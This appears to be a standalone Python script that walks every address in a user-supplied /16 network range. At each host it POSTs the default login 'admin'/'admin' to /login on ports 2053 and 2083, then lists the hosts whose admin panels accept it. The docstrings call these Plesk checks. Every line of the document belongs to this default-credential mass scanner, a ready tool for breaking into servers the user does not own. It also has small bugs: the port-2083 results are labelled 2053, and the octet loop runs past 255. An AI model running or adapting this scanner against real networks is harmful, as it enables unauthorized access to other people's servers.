
import requests
import os


# Set the timeout for requests
# please set by network status
timeout = 2


def ip_list(iprange):
    """
    Generate a list of IP addresses within the given range.
    """
    # clear file
    my_file = open("ips.txt", "w")
    my_file.write("")
    my_file.close()

    # Generate the IP addresses and write them to the file
    for y in range(257):
        for x in range(257):
            with open("ips.txt", "a+") as my_file:
                my_file.write(f"{iprange}.{y}.{x}\n")


ip_list(input("input ip range(xxx.xxx) ==>"))


def checker83(ip: str, timeout):
    """
    Check if the Plesk server at the given IP address and port 2083 is accessible.
    """
    try:
        url = f"http://{ip}:2083/login"

        data = {'username': 'admin', 'password': 'admin'}

        response = requests.post(url, data, timeout=timeout)

        response_json = response.json()

        if response_json["success"]:
            return True
        else:
            return response_json['msg']
    except:
        return False


def checker53(ip: str, timeout):
    """
    Check if the Plesk server at the given IP address and port 2053 is accessible.
    """
    try:
        url = f"http://{ip}:2053/login"

        data = {'username': 'admin', 'password': 'admin'}

        response = requests.post(url, data, timeout=timeout)

        response_json = response.json()

        if response_json["success"]:
            return True
        else:
            return response_json['msg']
    except:
        return False


# Read the IP addresses from the file
with open("ips.txt", "r") as file:
    ips = file.readlines()

# Iterate over the IP addresses and check if the Plesk servers are accessible
for ip in ips:
    ip = ip.strip()
    result53 = checker53(ip, timeout)
    result83 = checker83(ip, timeout)

    if result53 == False:
        pass
    elif result53 == True:
        print(ip, ":2053")
    else:
        print(ip, ":2053", result53)

    if result83 == False:
        pass
    elif result83 == True:
        print(ip, ":2083")
    else:
        print(ip, ":2053", result83)

input("press enter to close")
os.system("clear")
